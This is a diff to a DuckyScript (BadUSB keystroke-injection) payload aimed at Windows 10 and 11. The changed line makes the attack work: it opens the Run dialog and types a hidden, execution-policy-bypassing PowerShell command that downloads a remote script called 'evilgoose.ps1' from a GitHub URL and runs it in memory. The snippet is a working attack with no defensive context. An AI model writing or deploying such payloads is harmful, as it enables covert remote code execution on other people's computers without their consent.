@@ -8,5 +8,5 @@ REM     Target: Windows 10, 11
 
 GUI r
 DELAY 500
-STRING powershell -w h -NoP -NonI -Ep Bypass -File 'https://raw.githubusercontent.com/kcoderhtml/x/main/evilgoose.ps1'
+STRING powershell -w h -NoP -NonI -Ep Bypass -Command "& {iex (iwr 'https://raw.githubusercontent.com/kcoderhtml/x/main/evilgoose.ps1').Content}"
 ENTER
